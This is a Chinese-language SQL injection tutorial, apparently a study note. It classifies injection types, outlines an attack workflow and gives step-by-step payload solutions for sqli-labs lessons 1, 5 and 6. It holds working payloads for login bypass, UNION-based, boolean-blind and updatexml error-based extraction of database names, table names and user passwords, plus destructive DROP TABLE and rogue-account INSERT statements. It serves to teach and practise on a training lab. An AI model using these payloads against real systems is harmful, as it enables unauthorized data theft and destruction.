
> SQL 注入（SQL Injection，SQLi）是一种利用 Web 应用程序中输入验证漏洞的攻击方法。攻击者通过在输入字段（如登录框、搜索栏或 URL 参数）中构造恶意 SQL 语句，导致应用程序生成意外的 SQL 查询，从而获得非授权访问数据库的权限，进而获取敏感数据、篡改数据或破坏数据库。
## 1. SQL 注入的基本原理
SQL 注入攻击通过篡改应用程序原本预期的 SQL 查询，将恶意代码注入到数据库操作中。例如，在身份验证场景中，典型的 SQL 查询为：
```sql
SELECT * FROM users WHERE username = 'user' AND password = 'password';
```
攻击者可以输入 username 为 admin` -- ，将password留空。此时查询将被更改为：
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '';
```
由于 `--或者#` 为注释符，password条件被忽略，SQL 查询实际上变为：
```sql
SELECT * FROM users WHERE username = 'admin';
```
从而绕过了身份验证，直接登录admin 账户。

万能密钥：' or 1=1#

```sql
SELECT * FROM users WHERE username = '' or 1=1#'AND password = 'password';
```

## 2.SQL注入的分类
SQL注入是一种通过恶意输入的SQL代码，操控数据库执行非预期的操作或泄露信息的攻击手段。针对SQL注入的分类方式，可以从多个维度来进行详细分析。以下是按“注入位置”、“反馈结果”和“数据类型”分类的详细说明。

### 1. **根据注入位置分类**

SQL注入的攻击位置是指攻击者通过输入数据来篡改或影响SQL查询的执行位置。常见的注入位置有以下几种：

#### **GET型注入**
- **定义**：注入发生在URL中的查询字符串参数，通常通过浏览器的地址栏输入参数。
- **特点**：攻击者通过在URL中的参数传递恶意SQL代码。通常涉及HTTP GET请求，例如在查询中插入`id=1' OR '1'='1`。
- **示例**：
  ```sql
  http://example.com/product?id=1' OR '1'='1
  ```
- **风险**：GET型注入很容易被发现，因为恶意SQL注入直接暴露在浏览器的URL中。

#### **POST型注入**
- **定义**：注入发生在HTTP请求的主体部分，通常通过表单提交的数据。
- **特点**：攻击者通过表单字段（如登录表单、搜索框等）提交恶意SQL语句。在POST请求中，数据并不显示在URL中，相对不易被直接发现。
- **示例**：通过登录表单提交的用户名或密码字段，例如：
  ```sql
  username=admin' -- 
  password=anypassword
  ```
- **风险**：POST型注入相对于GET型来说，更难以通过直接查看URL发现，但依然可以通过捕获HTTP请求进行分析。

#### **HEAD型注入**
- **定义**：注入发生在HTTP请求的头部。虽然HTTP请求头通常用于传递元数据（如User-Agent、Content-Type等），但某些应用会基于头部信息构造SQL查询，从而成为攻击的入口。
- **特点**：这种类型的注入并不常见，通常出现在一些特殊的应用中，这些应用将HTTP请求头部的内容直接传递到数据库查询中。
- **示例**：通过HTTP头部信息（如User-Agent、Referer等）注入SQL代码。
- **风险**：这种类型的注入较为隐蔽，需要攻击者对请求和服务器的实现细节有较高的了解。

### 2. **根据反馈结果分类**

根据反馈的结果，SQL注入可以分为有回显（显错注入）和无回显（盲注）两种类型。

#### **有回显（显错注入）**
- **定义**：攻击者输入的SQL注入会返回数据库的错误信息或查询结果。通过错误信息，攻击者可以进一步推测数据库的结构、表名、列名等信息。
- **特点**：返回的错误信息通常会包含数据库的结构、查询语法错误等有用的信息。这类注入能直接提供对数据库的详细反馈，攻击者可以利用这些信息构造更精确的攻击。
- **示例**：攻击者输入 `id=1' AND 1=1`，如果返回的页面显示正确的查询结果，攻击者就知道SQL注入成功了。
  ```sql
  SQL syntax error in your query...
  ```

#### **无回显（盲注）**
- **定义**：攻击者的注入不会返回错误信息或者查询结果，数据库执行的响应对攻击者来说不可见。通常，盲注通过应用的行为差异来推断数据库的结构或数据。
- **特点**：攻击者通过观察应用的响应（如页面加载时间、显示的内容等）来推测注入是否成功。盲注通常比显错注入更难以发现，因为它不直接暴露数据库错误。
- **盲注的分类**：
  - **基于时间盲注**：攻击者通过注入SQL语句引起数据库延时（如使用`SLEEP()`函数），从而推测查询的正确性。
    - 示例：`id=1' AND IF(1=1, SLEEP(5), 0)`
  - **基于布尔值盲注**：攻击者通过注入`TRUE`或`FALSE`的判断语句，推测某个条件是否成立，从而判断数据库结构或数据。
    - 示例：`id=1' AND 1=1`（返回正常页面）与 `id=1' AND 1=2`（返回不同的页面）通过对比不同的响应，推测数据库信息。

### 3. **根据数据类型分类**

SQL注入的另一种分类方法是基于攻击数据类型的分类，主要是根据传入的参数数据类型来区分。常见的数据类型有数字型和字符型。

#### **数字型注入**
- **定义**：攻击者通过注入数字型数据来构造SQL语句。
- **特点**：攻击通常发生在期望数字型参数的地方（如ID、数量、价格等）。攻击者可以通过注入数字来操控SQL查询的逻辑。
- **示例**：在查询参数`id=1`的位置，注入数字型SQL语句。
  ```sql
  id=1' OR 1=1
  ```
- **风险**：数字型注入比较容易构造，且通常能够影响数据库的查询结果。

#### **字符型注入**
- **定义**：攻击者通过注入字符型数据来构造SQL语句。
- **特点**：攻击发生在期望字符型参数的地方（如用户名、密码、搜索关键词等）。字符型注入利用SQL语句的拼接，能够有效改变查询逻辑或泄露敏感信息。
- **示例**：在查询参数`username=admin`的位置，注入字符型SQL语句。
  ```sql
  username=admin' OR '1'='1
  password=anypassword
  ```
- **风险**：字符型注入常常通过改变查询的逻辑，导致认证绕过、数据泄露等安全问题。

---

## SQL注入流程
SQL注入（SQL Injection）是一种攻击方式，攻击者通过向SQL查询语句中插入恶意的SQL代码，进而控制数据库或获取敏感数据。SQL注入攻击流程通常包括以下几个步骤：

### 1. 寻找注入点
攻击者通过各种方式寻找网站或应用程序中的注入点。通常这些点存在于用户输入和数据库交互的地方，比如：
- 登录表单
- 搜索框
- URL查询字符串（GET请求）
- POST请求参数
- Cookie中的值

### 2. 判断注入点是否存在
通过输入特定的字符或字符串（如单引号 `'` 或双引号 `"`），查看是否能触发错误或异常，从而判断是否存在SQL注入漏洞。常见的测试字符包括：
- 单引号 `'`（用于结束字符串常量）
- 双引号 `"`
- 分号 `;`（用于分隔SQL语句）
- 双破折号 `--`（SQL注释符）
- 井号 `#`（SQL注释符）

如果出现数据库错误消息或应用程序崩溃，说明有可能存在SQL注入漏洞。

### 3. 判断参数类型（数值型或字符型）
注入点一旦确定，需要进一步判断用户输入的参数是数值型还是字符型：
- **数值型**：如ID字段一般为数字类型。在这种情况下，攻击者可以直接尝试数字注入，例如：`1 OR 1=1`
- **字符型**：如用户名、电子邮件等通常为字符串类型。在这种情况下，攻击者需要在输入值中插入引号进行测试，例如：`' OR '1'='1`

如果是字符型输入，攻击者还需要继续判断SQL语句的闭合方式，即SQL语句中字符串的引号闭合方式。

### 4. 判断闭合方式（对字符型字段特别重要）
- **双引号闭合**：例如：`"admin' --"`
- **单引号闭合**：例如：`'admin' --`

攻击者需要测试应用程序使用哪种闭合方式，通常通过直接输入不同的引号进行尝试。

### 5. 判断列数（通过 `UNION` 查询）
一旦确认存在SQL注入漏洞，攻击者会尝试通过 `UNION` 查询来暴露更多信息，特别是通过判断返回结果的列数。`UNION` 查询可以结合多个查询结果，攻击者使用它来推测查询语句返回的列数。
例如，如果查询返回两列数据，攻击者可以使用：
```sql
' UNION SELECT null, null --
```
通过逐一增加 `null` 值，直到不再返回错误，就能确定列数。

### 6. 获取数据库名
一旦确认存在SQL注入漏洞且可以使用 `UNION` 查询，攻击者可以尝试获取数据库的基本信息。比如，攻击者可以使用如下语句获取数据库名：
```sql
' UNION SELECT null, database() --
```
`database()` 是一个MySQL函数，它返回当前数据库的名称。

### 7. 获取表名
在获取数据库名后，攻击者接下来可能会尝试获取该数据库中的表名。攻击者可以使用如下语句：
```sql
' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() --
```
这会查询出当前数据库中的所有表名。

### 8. 获取列名
攻击者确定了表名后，接下来的目标通常是获取表的列名。可以使用如下语句获取某个表的列名：
```sql
' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='target_table' --
```
`target_table` 是攻击者目标的表名。

### 9. 获取数据
一旦获得了列名，攻击者可以利用 `UNION` 查询获取具体的数据。例如，如果攻击者知道某个表的列名为 `username` 和 `password`，可以通过如下语句获取数据：
```sql
' UNION SELECT null, username, password FROM users --
```
这将返回 `users` 表中的 `username` 和 `password` 列的数据。

### 10. 执行任意SQL操作（如删除、修改、插入数据等）
如果攻击者能够完全控制SQL语句，可能还会进行更具破坏性的操作，例如：
- 删除数据：`DROP TABLE users;`
- 修改数据：`UPDATE users SET password='newpassword' WHERE username='admin';`
- 插入数据：`INSERT INTO users (username, password) VALUES ('attacker', 'password123');`

这些操作会对目标系统造成严重影响。

### 11. 隐蔽攻击（防止被检测）
为了隐藏注入攻击，攻击者可能采取以下措施：
- 利用时间盲注（Time-Based Blind Injection），通过延时操作来判断注入是否成功。例如：`' OR SLEEP(5) --`，如果延时成功，说明注入成功。
- 利用错误盲注（Error-Based Blind Injection），通过构造导致错误的SQL语句，分析错误信息的反馈来获取信息。
- 编码/加密请求，避开输入验证和防火墙的检测。

## 举例
**sqli-labs Lesson 1**

### 1.  ‌正常输入（id=1）‌
原SQL语句‌：SELECT * FROM users WHERE id='1';
原理‌：输入1被包裹在单引号内，语法正确，正常执行。
### 2. ‌ 异常输入（id=1'）‌
原SQL语句‌：SELECT * FROM users WHERE id='1'';
报错原因‌：单引号未闭合，导致语法错误（id='1'后多出一个单引号）。
攻击意义‌：通过错误信息确认存在注入点。
### 3. ‌ 注释修复（id=1' --+）‌
原SQL语句‌：SELECT * FROM users WHERE id='1' --+ ';
原理‌：--+是SQL注释符（--），+被URL编码为空格。注释掉后续字符（包括原语句的';），修复语法错误。
攻击意义‌：确认注入可行性。
### 4.  ‌探测列数（id=1' ORDER BY N --+）‌
示例‌：id=1' ORDER BY 10 --+
原SQL语句‌：SELECT * FROM users WHERE id='1' ORDER BY 10 -- ';
原理‌：若原查询列数小于N，报错；反之正常。逐步调整N（如10→5→3）确定列数。
攻击意义‌：为后续UNION查询做准备。
### 5. ‌ 联合查询（id=-1' UNION SELECT 1,2,3 --+）‌
示例‌：id=-1' UNION SELECT 1,2,3 --+
原SQL语句‌：SELECT * FROM users WHERE id='-1' UNION SELECT 1,2,3 -- ';
原理‌：id=-1确保原查询无结果，使页面显示UNION后的数据。页面显示2或3，表示该位置可回显数据。
攻击意义‌：确定回显位，用于泄露信息。
### 6. ‌ 泄露数据库名（id=-1' UNION SELECT 1,database(),3 --+）‌
原SQL语句‌：SELECT ... UNION SELECT 1,database(),3 -- ';
原理‌：database()返回当前数据库名（如security），显示在回显位。
### 7. ‌ 泄露表名（id=-1' UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) ...),3 --+）‌
示例‌：SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='security'
原理‌：information_schema.tables存储所有表信息。GROUP_CONCAT()将多行结果合并为字符串（如users,emails）。
攻击意义‌：获取目标表名（如users）。
### 8. ‌ 泄露列名（id=-1' UNION SELECT 1,(SELECT GROUP_CONCAT(column_name) ...),3 --+）‌
示例‌：SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'
原理‌：从information_schema.columns获取列名（如id,username,password）。
### 9. ‌ 窃取数据（id=-1' UNION SELECT 1,(SELECT GROUP_CONCAT(username) FROM users),3 --+）‌
示例‌：SELECT GROUP_CONCAT(username) FROM users
原理‌：直接查询users表的username列，数据回显到页面。

### 显注（以第一关为例）

```sql
?id=1' --+
select * form users where id=1' --   
#URL中的+号被转义成空格

id=1' and 1=1 --+  
#判断SQL是否可以注入

id=1' order by 10--+  
#以第10列排序 根据此命令判定列数

id=1' union select 1,2,3--+ 
id=-1' union select 1,2,3--+  
#回显位

id=-1' union select 1,database(),3--+  
#获取数据库名

id=-1' union select 1,(select table_name from information_schema.tables where table_schema='security'),3--+  
#由于网站限制，只能显示一行，但是返回结果是多行，所以报错。
其中information_schema 是MySQL数据库中一个特殊的数据库，它包含了数据库服务器的元数据信息，比如数据库名、表名、列名、权限等等

id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),3--+  
#正确显示出所有表名

id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),3--+   
#查找users表中各列（字段）的名称

id=-1' union select 1,(select group_concat(username) from users),3--+  
#查询users表中username这一列的所有值
```

### 盲注 （以第五关为例）

```sql
?id=1'  
#观察页面是否异常，并判定闭合方式

?id=1' --+
#若页面恢复正常，说明注入点为单引号闭合。

?id=1' and 1=1 --+
#构造真假条件，观察页面反应。真条件（返回“You are in...”）

?id=1' and 1=2 --+
#构造假条件，观察页面反应。假条件（无内容）。以上步骤页面行为存在差异，确认了布尔盲注的可行性。

?id=1' and length(database())=8 --+
#猜解数据库名长度。若页面返回正常，说明数据库名长度为8

?id=1' and ascii(substr(database(),1,1))>100 --+
#通过二分法逐步缩小ASCII码范围，确定每个字符（如第一个字符为's'，ASCII码115）获取数据库名为security

?id=1' and (select count(table_name) from information_schema.tables where table_schema='security')=4 --+
#猜解表数量,确认当前数据库有4个表。

?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))>100 --+
#逐个字符猜解，得到表名

?id=1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))>100 --+
#猜解列名，如id，username，password

?id=1' and ascii(substr((select password from users where username='admin' limit 0,1),1,1))>50 --+
#猜解密码

```

# 以第六关为例
```sql
updatexml(XML_document, XPath_string, new_value)
# XML_document:需要被修改的 XML 文档   XPath_string：一个合法的 XPath 表达式，用于定位 XML 文档中需要修改的节点  new_value：替换目标 XML 节点的新值

?id=1 页面返回正常；输入 ?id=1' 无报错，排除单引号闭合。尝试 ?id=1\" 触发语法错误，显示双引号闭合的报错信息‌

输入 ?id=1" --+（闭合双引号并注释后续代码），页面恢复正常，确认注入点为‌双引号闭合字符型注入

?id=1" and updatexml(1, concat(0x7e, (select database()), 0x7e), 1) --+
#报错显示security数据库名

?id=1" and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 0,1)), 1) --+
#报错显示表名，通过修改limit值显示所有表名

?id=1" and updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_name='users' limit 0,1)), 1) --+
#显示列名 通过修改limit值显示所有列名

?id=1" and updatexml(1, concat(0x7e, (select concat(username, ':', password) from users limit 0,1)), 1) --+
#获取数据 通过修改limit值显示所有数据


```